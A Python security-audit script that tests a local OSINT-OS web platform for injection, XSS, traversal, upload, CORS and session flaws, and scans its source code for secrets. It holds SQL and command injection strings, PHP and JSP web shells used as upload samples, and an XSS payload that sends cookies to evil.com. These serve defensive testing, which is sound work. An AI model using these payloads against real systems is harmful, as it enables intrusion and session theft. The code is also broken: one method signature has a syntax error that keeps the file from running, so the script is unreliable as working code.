#!/usr/bin/env python3
"""
COMPREHENSIVE SECURITY VALIDATION FOR OSINT-OS PLATFORM
Production Readiness Security Audit - CRITICAL URGENT
"""

import asyncio
import json
import logging
import time
import requests
import hashlib
import re
import os
import sys
from datetime import datetime
from typing import Dict, List, Any, Optional
from pathlib import Path

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

class ComprehensiveSecurityValidator:
    """Comprehensive security validation suite for OSINT-OS platform."""
    
    def __init__(self, base_url: str = "http://localhost:8000"):
        self.base_url = base_url
        self.results = {
            "timestamp": datetime.utcnow().isoformat(),
            "test_results": {},
            "vulnerabilities": [],
            "critical_issues": [],
            "recommendations": [],
            "overall_status": "UNKNOWN"
        }
        self.session = requests.Session()
        
    def run_all_tests(self) -> Dict[str, Any]:
        """Execute comprehensive security validation."""
        logger.critical("🚨 STARTING COMPREHENSIVE SECURITY VALIDATION - PRODUCTION READINESS AUDIT")
        
        test_methods = [
            ("security_headers", self.test_security_headers),
            ("injection_attacks", self.test_injection_vulnerabilities),
            ("authentication_bypass", self.test_authentication_bypass),
            ("rate_limiting", self.test_rate_limiting),
            ("cors_security", self.test_cors_security),
            ("websocket_security", self.test_websocket_security),
            ("input_validation", self.test_input_validation),
            ("hardcoded_secrets", self.test_hardcoded_secrets),
            ("hash_migration", self.test_hash_migration),
            ("xss_vulnerabilities", self.test_xss_vulnerabilities),
            ("csrf_protection", self.test_csrf_protection),
            ("error_disclosure", self.test_error_disclosure),
            ("directory_traversal", self.test_directory_traversal),
            ("file_upload_security", self.test_file_upload_security),
            ("session_security", self.test_session_security)
        ]
        
        for test_name, test_method in test_methods:
            try:
                logger.info(f"🔍 Running {test_name} test...")
                result = test_method()
                self.results["test_results"][test_name] = result
                logger.info(f"✅ {test_name} test completed: {result.get('status', 'UNKNOWN')}")
            except Exception as e:
                logger.error(f"❌ {test_name} test failed: {e}")
                self.results["test_results"][test_name] = {
                    "status": "ERROR",
                    "error": str(e),
                    "critical": True
                }
        
        self._calculate_overall_status()
        return self.results
    
    def test_security_headers(self) -> Dict[str, Any]:
        """Test for comprehensive security headers."""
        result = {"status": "PASS", "issues": [], "critical": False}
        
        try:
            response = self.session.get(f"{self.base_url}/")
            
            required_headers = {
                "Content-Security-Policy": "CSP header",
                "X-Content-Type-Options": "Content type protection",
                "X-Frame-Options": "Clickjacking protection",
                "X-XSS-Protection": "XSS protection",
                "Referrer-Policy": "Referrer policy",
                "Permissions-Policy": "Permissions policy"
            }
            
            for header, description in required_headers.items():
                if header not in response.headers:
                    result["issues"].append(f"Missing {header}: {description}")
                    result["critical"] = header in ["Content-Security-Policy", "X-Content-Type-Options"]
                else:
                    logger.info(f"✅ {header} found: {response.headers[header][:100]}...")
            
            # Check HSTS for production
            if "Strict-Transport-Security" not in response.headers:
                result["issues"].append("Missing HSTS header (should be present in production)")
            
            if result["critical"]:
                result["status"] = "FAIL"
            elif result["issues"]:
                result["status"] = "WARN"
                
        except Exception as e:
            result["status"] = "ERROR"
            result["error"] = str(e)
            result["critical"] = True
        
        return result
    
    def test_injection_vulnerabilities(self) -> Dict[str, Any]:
        """Test for SQL injection and other injection attacks."""
        result = {"status": "PASS", "vulnerabilities": [], "critical": False}
        
        # SQL injection payloads
        sql_payloads = [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "' UNION SELECT * FROM users --",
            "1'; EXEC xp_cmdshell('dir'); --",
            "' OR 1=1 --"
        ]
        
        # Command injection payloads
        cmd_payloads = [
            "; ls -la",
            "| whoami",
            "& cat /etc/passwd",
            "`id`",
            "$(id)"
        ]
        
        # XSS payloads
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "';alert('XSS');//"
        ]
        
        all_payloads = sql_payloads + cmd_payloads + xss_payloads
        
        try:
            # Test various endpoints
            test_endpoints = ["/api/osint/search", "/api/investigations", "/api/auth/login"]
            
            for endpoint in test_endpoints:
                for payload in all_payloads:
                    # Test as query parameter
                    try:
                        response = self.session.get(f"{self.base_url}{endpoint}", params={"q": payload}, timeout=5)
                        
                        # Check for SQL error messages
                        sql_errors = ["sql syntax", "mysql_fetch", "ora-", "microsoft odbc", "sqlite_"]
                        if any(error in response.text.lower() for error in sql_errors):
                            result["vulnerabilities"].append(f"SQL injection vulnerability at {endpoint} with payload: {payload}")
                            result["critical"] = True
                        
                        # Check for command execution
                        cmd_errors = ["uid=", "gid=", "root:", "bin/bash"]
                        if any(error in response.text.lower() for error in cmd_errors):
                            result["vulnerabilities"].append(f"Command injection vulnerability at {endpoint} with payload: {payload}")
                            result["critical"] = True
                            
                        # Check for XSS reflection
                        if payload.replace("<", "&lt;").replace(">", "&gt;") not in response.text and payload in response.text:
                            result["vulnerabilities"].append(f"XSS vulnerability at {endpoint} with payload: {payload}")
                            result["critical"] = True
                            
                    except requests.exceptions.RequestException:
                        continue  # Expected for some endpoints
            
            if result["critical"]:
                result["status"] = "FAIL"
            elif result["vulnerabilities"]:
                result["status"] = "WARN"
                
        except Exception as e:
            result["status"] = "ERROR"
            result["error"] = str(e)
            result["critical"] = True
        
        return result
    
    def test_authentication_bypass(self) -> Dict[str, Any]:
        """Test for authentication and authorization bypasses."""
        result = {"status": "PASS", "bypasses": [], "critical": False}
        
        try:
            # Test without authentication
            protected_endpoints = [
                "/api/investigations",
                "/api/admin/dashboard",
                "/api/osint/advanced-search"
            ]
            
            for endpoint in protected_endpoints:
                try:
                    response = self.session.get(f"{self.base_url}{endpoint}", timeout=5)
                    
                    # Should return 401/403 for protected endpoints
                    if response.status_code not in [401, 403, 404]:
                        result["bypasses"].append(f"Authentication bypass possible at {endpoint} - Status: {response.status_code}")
                        result["critical"] = True
                except requests.exceptions.RequestException:
                    continue
            
            # Test with invalid tokens
            invalid_tokens = [
                "invalid.token.here",
                "Bearer invalid",
                "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.invalid.signature",
                ""
            ]
            
            for token in invalid_tokens:
                headers = {"Authorization": f"Bearer {token}"} if token else {}
                try:
                    response = self.session.get(f"{self.base_url}/api/investigations", headers=headers, timeout=5)
                    if response.status_code not in [401, 403, 404]:
                        result["bypasses"].append(f"Invalid token accepted: {token[:20]}...")
                        result["critical"] = True
                except requests.exceptions.RequestException:
                    continue
            
            if result["critical"]:
                result["status"] = "FAIL"
            elif result["bypasses"]:
                result["status"] = "WARN"
                
        except Exception as e:
            result["status"] = "ERROR"
            result["error"] = str(e)
            result["critical"] = True
        
        return result
    
    def test_rate_limiting(self) -> Dict[str, Any]:
        """Test rate limiting functionality."""
        result = {"status": "PASS", "issues": [], "critical": False}
        
        try:
            # Test rapid requests to login endpoint
            url = f"{self.base_url}/api/auth/login"
            success_count = 0
            rate_limited = False
            
            for i in range(50):  # Send 50 rapid requests
                try:
                    response = self.session.post(url, json={"username": "test", "password": "test"}, timeout=2)
                    if response.status_code == 429:
                        rate_limited = True
                        break
                    elif response.status_code == 200:
                        success_count += 1
                except requests.exceptions.RequestException:
                    continue
            
            if not rate_limited and success_count > 10:
                result["issues"].append("No rate limiting detected on authentication endpoint")
                result["critical"] = True
            
            # Test rate limiting on search endpoint
            search_url = f"{self.base_url}/api/osint/search"
            search_requests = 0
            
            for i in range(30):
                try:
                    response = self.session.get(search_url, params={"q": f"test{i}"}, timeout=2)
                    if response.status_code == 429:
                        rate_limited = True
                        break
                    search_requests += 1
                except requests.exceptions.RequestException:
                    continue
            
            if not rate_limited and search_requests > 20:
                result["issues"].append("No rate limiting detected on search endpoint")
                result["critical"] = True
            
            if result["critical"]:
                result["status"] = "FAIL"
            elif not rate_limited:
                result["status"] = "WARN"
                result["issues"].append("Rate limiting may not be properly configured")
                
        except Exception as e:
            result["status"] = "ERROR"
            result["error"] = str(e)
            result["critical"] = True
        
        return result
    
    def test_cors_security(self -> Dict[str, Any]:
        """Test CORS configuration security."""
        result = {"status": "PASS", "issues": [], "critical": False}
        
        try:
            # Test with malicious origin
            malicious_origins = [
                "https://evil.com",
                "http://malicious-site.net",
                "null"
            ]
            
            for origin in malicious_origins:
                headers = {"Origin": origin}
                response = self.session.get(f"{self.base_url}/", headers=headers)
                
                allowed_origin = response.headers.get("Access-Control-Allow-Origin", "")
                
                if allowed_origin == "*" or allowed_origin == origin:
                    result["issues"].append(f"Insecure CORS configuration allows origin: {origin}")
                    result["critical"] = True
            
            # Check for credential exposure
            response = self.session.options(f"{self.base_url}/api/", headers={"Origin": "http://localhost:3000"})
            
            if response.headers.get("Access-Control-Allow-Credentials") == "true" and \
               response.headers.get("Access-Control-Allow-Origin") == "*":
                result["issues"].append("CORS credentials exposed to all origins")
                result["critical"] = True
            
            if result["critical"]:
                result["status"] = "FAIL"
            elif result["issues"]:
                result["status"] = "WARN"
                
        except Exception as e:
            result["status"] = "ERROR"
            result["error"] = str(e)
            result["critical"] = True
        
        return result
    
    def test_websocket_security(self) -> Dict[str, Any]:
        """Test WebSocket security."""
        result = {"status": "PASS", "issues": [], "critical": False}
        
        try:
            import websocket
            
            # Test unauthenticated WebSocket connection
            ws_url = f"ws://localhost:8000/api/ws/test-pipeline"
            
            try:
                ws = websocket.create_connection(ws_url, timeout=5)
                result["issues"].append("WebSocket connection accepted without authentication")
                result["critical"] = True
                ws.close()
            except Exception:
                # This is expected - connection should be rejected
                pass
            
            # Test WebSocket with fake authentication
            try:
                ws = websocket.create_connection(ws_url, timeout=5)
                ws.send(json.dumps({"type": "ping"}))
                response = ws.recv()
                if "error" not in response.lower():
                    result["issues"].append("WebSocket processes messages without proper authentication")
                    result["critical"] = True
                ws.close()
            except Exception:
                pass
            
            if result["critical"]:
                result["status"] = "FAIL"
                
        except ImportError:
            result["status"] = "SKIP"
            result["issues"].append("WebSocket library not available for testing")
        except Exception as e:
            result["status"] = "ERROR"
            result["error"] = str(e)
            result["critical"] = True
        
        return result
    
    def test_input_validation(self) -> Dict[str, Any]:
        """Test input validation and sanitization."""
        result = {"status": "PASS", "issues": [], "critical": False}
        
        try:
            # Test oversized payloads
            large_payload = "A" * (11 * 1024 * 1024)  # 11MB
            try:
                response = self.session.post(f"{self.base_url}/api/osint/search", 
                                           json={"query": large_payload}, timeout=5)
                if response.status_code != 413:
                    result["issues"].append("Large payload accepted (potential DoS)")
                    result["critical"] = True
            except requests.exceptions.RequestException:
                pass  # Expected for large payloads
            
            # Test malicious content types
            malicious_types = [
                "application/javascript",
                "text/html",
                "../../etc/passwd"
            ]
            
            for content_type in malicious_types:
                headers = {"Content-Type": content_type}
                try:
                    response = self.session.post(f"{self.base_url}/api/auth/login", 
                                               json={"test": "data"}, headers=headers, timeout=5)
                    if response.status_code != 415:
                        result["issues"].append(f"Malicious content type accepted: {content_type}")
                        result["critical"] = True
                except requests.exceptions.RequestException:
                    continue
            
            if result["critical"]:
                result["status"] = "FAIL"
            elif result["issues"]:
                result["status"] = "WARN"
                
        except Exception as e:
            result["status"] = "ERROR"
            result["error"] = str(e)
            result["critical"] = True
        
        return result
    
    def test_hardcoded_secrets(self) -> Dict[str, Any]:
        """Test for hardcoded secrets in codebase."""
        result = {"status": "PASS", "secrets_found": [], "critical": False}
        
        try:
            # Common secret patterns
            secret_patterns = [
                (r'password\s*=\s*["\'][^"\']+["\']', "Hardcoded password"),
                (r'secret\s*=\s*["\'][^"\']+["\']', "Hardcoded secret"),
                (r'api_key\s*=\s*["\'][^"\']+["\']', "Hardcoded API key"),
                (r'token\s*=\s*["\'][^"\']+["\']', "Hardcoded token"),
                (r'aws_access_key_id\s*=\s*["\'][^"\']+["\']', "AWS access key"),
                (r'aws_secret_access_key\s*=\s*["\'][^"\']+["\']', "AWS secret key"),
                (r'mongodb://[^@]+:[^@]+@', "MongoDB connection string"),
                (r'mysql://[^@]+:[^@]+@', "MySQL connection string"),
                (r'postgresql://[^@]+:[^@]+@', "PostgreSQL connection string")
            ]
            
            # Scan Python files
            for root, dirs, files in os.walk("/home/ishanp/Documents/GitHub/OSINT-OS"):
                # Skip common non-code directories
                dirs[:] = [d for d in dirs if d not in ['__pycache__', '.git', 'node_modules', '.venv']]
                
                for file in files:
                    if file.endswith('.py'):
                        file_path = os.path.join(root, file)
                        try:
                            with open(file_path, 'r', encoding='utf-8') as f:
                                content = f.read()
                                
                                for pattern, description in secret_patterns:
                                    matches = re.finditer(pattern, content, re.IGNORECASE)
                                    for match in matches:
                                        line_num = content[:match.start()].count('\n') + 1
                                        result["secrets_found"].append({
                                            "file": file_path,
                                            "line": line_num,
                                            "type": description,
                                            "match": match.group()[:50] + "..." if len(match.group()) > 50 else match.group()
                                        })
                                        result["critical"] = True
                        except Exception:
                            continue
            
            if result["critical"]:
                result["status"] = "FAIL"
                
        except Exception as e:
            result["status"] = "ERROR"
            result["error"] = str(e)
            result["critical"] = True
        
        return result
    
    def test_hash_migration(self) -> Dict[str, Any]:
        """Test MD5 to SHA-256 migration completeness."""
        result = {"status": "PASS", "md5_usage": [], "critical": False}
        
        try:
            # Scan for MD5 usage
            md5_patterns = [
                r'md5\(',
                r'hashlib\.md5',
                r'from hashlib import md5',
                r'import md5'
            ]
            
            for root, dirs, files in os.walk("/home/ishanp/Documents/GitHub/OSINT-OS"):
                dirs[:] = [d for d in dirs if d not in ['__pycache__', '.git', 'node_modules', '.venv']]
                
                for file in files:
                    if file.endswith('.py'):
                        file_path = os.path.join(root, file)
                        try:
                            with open(file_path, 'r', encoding='utf-8') as f:
                                content = f.read()
                                
                                for pattern in md5_patterns:
                                    matches = re.finditer(pattern, content, re.IGNORECASE)
                                    for match in matches:
                                        line_num = content[:match.start()].count('\n') + 1
                                        result["md5_usage"].append({
                                            "file": file_path,
                                            "line": line_num,
                                            "match": match.group()
                                        })
                                        result["critical"] = True
                        except Exception:
                            continue
            
            # Check for SHA-256 usage as replacement
            sha256_patterns = [
                r'sha256\(',
                r'hashlib\.sha256',
                r'from hashlib import sha256'
            ]
            
            sha256_found = False
            for root, dirs, files in os.walk("/home/ishanp/Documents/GitHub/OSINT-OS"):
                dirs[:] = [d for d in dirs if d not in ['__pycache__', '.git', 'node_modules', '.venv']]
                
                for file in files:
                    if file.endswith('.py'):
                        file_path = os.path.join(root, file)
                        try:
                            with open(file_path, 'r', encoding='utf-8') as f:
                                content = f.read()
                                for pattern in sha256_patterns:
                                    if re.search(pattern, content, re.IGNORECASE):
                                        sha256_found = True
                                        break
                        except Exception:
                            continue
            
            if result["critical"]:
                result["status"] = "FAIL"
                result["issues"] = [f"MD5 still in use in {len(result['md5_usage'])} locations"]
            elif not sha256_found:
                result["status"] = "WARN"
                result["issues"] = ["SHA-256 not found - verify migration is complete"]
                
        except Exception as e:
            result["status"] = "ERROR"
            result["error"] = str(e)
            result["critical"] = True
        
        return result
    
    def test_xss_vulnerabilities(self) -> Dict[str, Any]:
        """Test for XSS vulnerabilities in detail."""
        result = {"status": "PASS", "vulnerabilities": [], "critical": False}
        
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "';alert('XSS');//",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>",
            "<video><source onerror=alert('XSS')>",
            "<audio src=x onerror=alert('XSS')>"
        ]
        
        try:
            # Test search endpoints for XSS reflection
            test_endpoints = ["/api/osint/search", "/api/investigations"]
            
            for endpoint in test_endpoints:
                for payload in xss_payloads:
                    try:
                        # Test as query parameter
                        response = self.session.get(f"{self.base_url}{endpoint}", 
                                                 params={"q": payload, "search": payload}, timeout=5)
                        
                        # Check for unescaped XSS payload
                        if payload in response.text and payload.replace("<", "&lt;") not in response.text:
                            result["vulnerabilities"].append(f"XSS reflection at {endpoint} with payload: {payload[:50]}...")
                            result["critical"] = True
                        
                        # Test as POST data
                        response = self.session.post(f"{self.base_url}{endpoint}", 
                                                  json={"query": payload, "search": payload}, timeout=5)
                        
                        if payload in response.text and payload.replace("<", "&lt;") not in response.text:
                            result["vulnerabilities"].append(f"XSS in POST at {endpoint} with payload: {payload[:50]}...")
                            result["critical"] = True
                            
                    except requests.exceptions.RequestException:
                        continue
            
            if result["critical"]:
                result["status"] = "FAIL"
            elif result["vulnerabilities"]:
                result["status"] = "WARN"
                
        except Exception as e:
            result["status"] = "ERROR"
            result["error"] = str(e)
            result["critical"] = True
        
        return result
    
    def test_csrf_protection(self) -> Dict[str, Any]:
        """Test for CSRF protection."""
        result = {"status": "PASS", "issues": [], "critical": False}
        
        try:
            # Test for CSRF tokens
            response = self.session.get(f"{self.base_url}/api/auth/login")
            
            # Check for CSRF headers
            csrf_headers = [
                "X-CSRF-Token",
                "CSRF-Token", 
                "X-XSRF-Token"
            ]
            
            csrf_token_found = any(header in response.headers for header in csrf_headers)
            
            # Check for CSRF token in response body
            csrf_in_body = "csrf" in response.text.lower()
            
            if not csrf_token_found and not csrf_in_body:
                result["issues"].append("No CSRF protection detected")
                result["critical"] = True
            
            # Test SameSite cookie attribute
            cookies = response.cookies
            for cookie in cookies:
                if 'samesite' not in str(cookie).lower():
                    result["issues"].append(f"Cookie {cookie.name} missing SameSite attribute")
            
            if result["critical"]:
                result["status"] = "FAIL"
            elif result["issues"]:
                result["status"] = "WARN"
                
        except Exception as e:
            result["status"] = "ERROR"
            result["error"] = str(e)
            result["critical"] = True
        
        return result
    
    def test_error_disclosure(self) -> Dict[str, Any]:
        """Test for information disclosure in error messages."""
        result = {"status": "PASS", "disclosures": [], "critical": False}
        
        try:
            # Trigger various errors
            error_endpoints = [
                "/api/nonexistent",
                "/api/auth/invalid",
                "/api/osint/invalid-endpoint"
            ]
            
            for endpoint in error_endpoints:
                try:
                    response = self.session.get(f"{self.base_url}{endpoint}", timeout=5)
                    
                    # Check for information disclosure
                    disclosure_patterns = [
                        r"traceback",
                        r"exception",
                        r"error at line",
                        r"file path",
                        r"sql syntax",
                        r"internal server error",
                        r"stack trace",
                        r"debug"
                    ]
                    
                    for pattern in disclosure_patterns:
                        matches = re.findall(pattern, response.text, re.IGNORECASE)
                        if matches:
                            result["disclosures"].append(f"Information disclosure at {endpoint}: {pattern}")
                            result["critical"] = True
                            
                except requests.exceptions.RequestException:
                    continue
            
            if result["critical"]:
                result["status"] = "FAIL"
            elif result["disclosures"]:
                result["status"] = "WARN"
                
        except Exception as e:
            result["status"] = "ERROR"
            result["error"] = str(e)
            result["critical"] = True
        
        return result
    
    def test_directory_traversal(self) -> Dict[str, Any]:
        """Test for directory traversal vulnerabilities."""
        result = {"status": "PASS", "vulnerabilities": [], "critical": False}
        
        traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd"
        ]
        
        try:
            # Test file-related endpoints
            test_endpoints = ["/api/osint/search", "/api/investigations", "/api/"]
            
            for endpoint in test_endpoints:
                for payload in traversal_payloads:
                    try:
                        response = self.session.get(f"{self.base_url}{endpoint}", 
                                                 params={"file": payload, "path": payload}, timeout=5)
                        
                        # Check for successful file content
                        file_indicators = ["root:x:0:0", "bin/bash", "localhost", "windows"]
                        if any(indicator in response.text for indicator in file_indicators):
                            result["vulnerabilities"].append(f"Directory traversal at {endpoint} with payload: {payload}")
                            result["critical"] = True
                            
                    except requests.exceptions.RequestException:
                        continue
            
            if result["critical"]:
                result["status"] = "FAIL"
            elif result["vulnerabilities"]:
                result["status"] = "WARN"
                
        except Exception as e:
            result["status"] = "ERROR"
            result["error"] = str(e)
            result["critical"] = True
        
        return result
    
    def test_file_upload_security(self) -> Dict[str, Any]:
        """Test file upload security."""
        result = {"status": "PASS", "issues": [], "critical": False}
        
        try:
            # Test malicious file uploads
            malicious_files = {
                "malicious.php": "<?php system($_GET['cmd']); ?>",
                "shell.jsp": "<%@ page import='java.io.*' %><%=Runtime.getRuntime().exec(request.getParameter('cmd'))%>",
                "script.js": "<script>alert('XSS')</script>",
                "exploit.html": "<script>document.location='http://evil.com/steal.php?cookie='+document.cookie</script>"
            }
            
            for filename, content in malicious_files.items():
                files = {"file": (filename, content)}
                try:
                    response = self.session.post(f"{self.base_url}/api/upload", 
                                               files=files, timeout=5)
                    
                    # Check if upload was accepted
                    if response.status_code == 200:
                        result["issues"].append(f"Malicious file upload accepted: {filename}")
                        result["critical"] = True
                        
                except requests.exceptions.RequestException:
                    continue
            
            # Test oversized file upload
            large_content = "A" * (51 * 1024 * 1024)  # 51MB
            files = {"file": ("large.txt", large_content)}
            try:
                response = self.session.post(f"{self.base_url}/api/upload", 
                                           files=files, timeout=5)
                if response.status_code != 413:
                    result["issues"].append("Oversized file upload accepted")
                    result["critical"] = True
            except requests.exceptions.RequestException:
                pass
            
            if result["critical"]:
                result["status"] = "FAIL"
            elif result["issues"]:
                result["status"] = "WARN"
                
        except Exception as e:
            result["status"] = "ERROR"
            result["error"] = str(e)
            result["critical"] = True
        
        return result
    
    def test_session_security(self) -> Dict[str, Any]:
        """Test session security configuration."""
        result = {"status": "PASS", "issues": [], "critical": False}
        
        try:
            # Test session management
            response = self.session.post(f"{self.base_url}/api/auth/login", 
                                       json={"username": "test", "password": "test"}, timeout=5)
            
            cookies = response.cookies
            
            # Check for secure cookie attributes
            for cookie in cookies:
                cookie_str = str(cookie)
                
                # Check for Secure flag
                if "secure" not in cookie_str.lower():
                    result["issues"].append(f"Cookie {cookie.name} missing Secure flag")
                
                # Check for HttpOnly flag
                if "httponly" not in cookie_str.lower():
                    result["issues"].append(f"Cookie {cookie.name} missing HttpOnly flag")
                
                # Check for SameSite attribute
                if "samesite" not in cookie_str.lower():
                    result["issues"].append(f"Cookie {cookie.name} missing SameSite attribute")
            
            # Test session fixation
            session_id = self.session.cookies.get("session_id")
            if session_id:
                # Try to use session ID in URL
                response = self.session.get(f"{self.base_url}/api/profile?session_id={session_id}", timeout=5)
                if response.status_code == 200:
                    result["issues"].append("Session ID accepted in URL (potential fixation)")
                    result["critical"] = True
            
            if result["critical"]:
                result["status"] = "FAIL"
            elif result["issues"]:
                result["status"] = "WARN"
                
        except Exception as e:
            result["status"] = "ERROR"
            result["error"] = str(e)
            result["critical"] = True
        
        return result
    
    def _calculate_overall_status(self):
        """Calculate overall security status."""
        critical_failures = 0
        total_tests = len(self.results["test_results"])
        passed_tests = 0
        
        for test_name, test_result in self.results["test_results"].items():
            status = test_result.get("status", "ERROR")
            is_critical = test_result.get("critical", False)
            
            if status == "PASS":
                passed_tests += 1
            elif status in ["FAIL", "ERROR"] and is_critical:
                critical_failures += 1
                
                # Add to critical issues
                self.results["critical_issues"].append({
                    "test": test_name,
                    "issue": test_result.get("error", "Critical security test failure"),
                    "details": test_result
                })
        
        # Calculate overall status
        if critical_failures > 0:
            self.results["overall_status"] = "CRITICAL_FAILURE"
        elif passed_tests == total_tests:
            self.results["overall_status"] = "SECURE"
        elif passed_tests >= (total_tests * 0.8):
            self.results["overall_status"] = "NEEDS_ATTENTION"
        else:
            self.results["overall_status"] = "INSECURE"
        
        # Generate recommendations
        self._generate_recommendations()
    
    def _generate_recommendations(self):
        """Generate security recommendations based on test results."""
        recommendations = []
        
        for test_name, test_result in self.results["test_results"].items():
            if test_result.get("status") in ["FAIL", "WARN", "ERROR"]:
                if test_name == "security_headers":
                    recommendations.append("Implement missing security headers (CSP, HSTS, X-Frame-Options)")
                elif test_name == "injection_attacks":
                    recommendations.append("Implement proper input validation and parameterized queries")
                elif test_name == "authentication_bypass":
                    recommendations.append("Fix authentication bypasses and implement proper authorization")
                elif test_name == "rate_limiting":
                    recommendations.append("Implement comprehensive rate limiting on all endpoints")
                elif test_name == "cors_security":
                    recommendations.append("Restrict CORS configuration to specific trusted origins")
                elif test_name == "websocket_security":
                    recommendations.append("Implement proper authentication for WebSocket connections")
                elif test_name == "hardcoded_secrets":
                    recommendations.append("Remove all hardcoded secrets and use environment variables")
                elif test_name == "hash_migration":
                    recommendations.append("Complete MD5 to SHA-256 migration for all hashing operations")
                elif test_name == "xss_vulnerabilities":
                    recommendations.append("Implement proper output encoding and CSP headers")
                elif test_name == "csrf_protection":
                    recommendations.append("Implement CSRF tokens and SameSite cookie attributes")
                elif test_name == "input_validation":
                    recommendations.append("Implement strict input validation and size limits")
                elif test_name == "session_security":
                    recommendations.append("Configure secure cookie attributes (Secure, HttpOnly, SameSite)")
        
        self.results["recommendations"] = recommendations
    
    def save_report(self, filename: str = None):
        """Save security validation report."""
        if filename is None:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"security_validation_report_{timestamp}.json"
        
        with open(filename, 'w') as f:
            json.dump(self.results, f, indent=2, default=str)
        
        logger.critical(f"🚨 SECURITY REPORT SAVED: {filename}")
        return filename


def main():
    """Main execution function."""
    logger.critical("🚨 STARTING CRITICAL SECURITY VALIDATION - PRODUCTION READINESS AUDIT")
    
    validator = ComprehensiveSecurityValidator()
    
    # Run all security tests
    results = validator.run_all_tests()
    
    # Save report
    report_file = validator.save_report()
    
    # Print critical summary
    logger.critical("\n" + "="*80)
    logger.critical("🚨 CRITICAL SECURITY VALIDATION SUMMARY")
    logger.critical("="*80)
    logger.critical(f"Overall Status: {results['overall_status']}")
    logger.critical(f"Total Tests: {len(results['test_results'])}")
    logger.critical(f"Critical Issues: {len(results['critical_issues'])}")
    logger.critical(f"Recommendations: {len(results['recommendations'])}")
    
    if results['critical_issues']:
        logger.critical("\n🚨 CRITICAL VULNERABILITIES REQUIRING IMMEDIATE ATTENTION:")
        for issue in results['critical_issues']:
            logger.critical(f"  ❌ {issue['test']}: {issue['issue']}")
    
    if results['recommendations']:
        logger.critical("\n📋 IMMEDIATE ACTION REQUIRED:")
        for rec in results['recommendations']:
            logger.critical(f"  🔧 {rec}")
    
    logger.critical(f"\n📄 Full report saved to: {report_file}")
    
    # Determine exit code based on critical issues
    if results['overall_status'] == 'CRITICAL_FAILURE':
        logger.critical("❌ PRODUCTION DEPLOYMENT BLOCKED - CRITICAL SECURITY ISSUES")
        sys.exit(1)
    elif results['overall_status'] in ['INSECURE', 'NEEDS_ATTENTION']:
        logger.critical("⚠️  PRODUCTION DEPLOYMENT NOT RECOMMENDED - SECURITY ISSUES")
        sys.exit(2)
    else:
        logger.critical("✅ SECURITY VALIDATION PASSED - PRODUCTION READY")
        sys.exit(0)


if __name__ == "__main__":
    main()